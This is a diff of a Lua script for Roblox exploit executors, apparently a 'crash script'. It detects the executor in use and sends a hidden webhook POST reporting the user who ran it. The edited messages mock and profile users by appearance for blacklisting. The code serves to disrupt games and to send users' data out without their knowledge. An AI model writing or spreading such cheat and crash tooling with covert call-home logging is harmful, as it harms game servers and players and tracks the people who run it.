@@ -1,4 +1,4 @@
-wait(0.4)
+wait(0.2)
 function webhooksender(a,b)
 local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
@@ -33,7 +33,7 @@ request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 end
-webhooksender("If they look like a slender or a coolkid, they are getting blacklisted","This guy just executed a crash script lmaoo")
+webhooksender("Ping Noot Noot if one of the users look like a slender, COolKid or a skid","This user executed the script lmao :skull:")
 wait(0.001)
 local Players = game:GetService("Players")
 local HTTPService = game:GetService("HttpService")
